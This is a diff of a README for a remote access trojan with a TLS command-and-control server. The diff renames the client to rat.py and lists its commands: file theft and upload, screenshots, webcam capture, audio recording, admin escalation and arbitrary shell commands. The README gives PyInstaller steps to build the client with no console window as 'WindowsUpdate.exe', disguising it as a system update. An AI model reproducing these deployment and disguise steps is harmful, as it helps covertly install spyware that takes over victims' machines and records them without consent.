@@ -71,14 +71,14 @@ self.SERVER_CERT = """-----BEGIN CERTIFICATE-----
 ## 🚀 Usage
 ### Start Server
 ```bash
-python server.py
+python ShadowLink_Server.py
 ```
 
 ### Deploy Client
 
 **For testing:**
 ```bash
-python client.py
+python rat.py
 
 ```
 
@@ -87,7 +87,7 @@ python client.py
 # Install PyInstaller
 pip install pyinstaller
 # Convert without CMD window
-pyinstaller --onefile --noconsole --name "WindowsUpdate" client.py
+pyinstaller --onefile --noconsole --name "WindowsUpdate" rat.py
 
 # Output: dist/WindowsUpdate.exe
 
@@ -105,10 +105,17 @@ pyinstaller --onefile --noconsole --name "WindowsUpdate" client.py
 
 ## 💻 Available Commands
 ```
-download <file> upload <file> screenshot
-image <camera> audio <seconds> cd <path>
-/admin /help /exit
-/quit <any shell command>
+download <file>
+upload <file>
+screenshot
+image <camera>
+audio <seconds>
+cd <path>
+/admin
+/help
+/exit
+/quit
+<any shell command>
 ```
 
 ---
@@ -136,7 +143,7 @@ Server (C2) ◄──TLS/SSL──► Client (RAT)
 
 **Certificate Errors:**
 - Recreate certificates with the correct IP address
-- Ensure the certificate is included in `client.py`
+- Ensure the certificate is included in `rat.py`
 
 ---
 
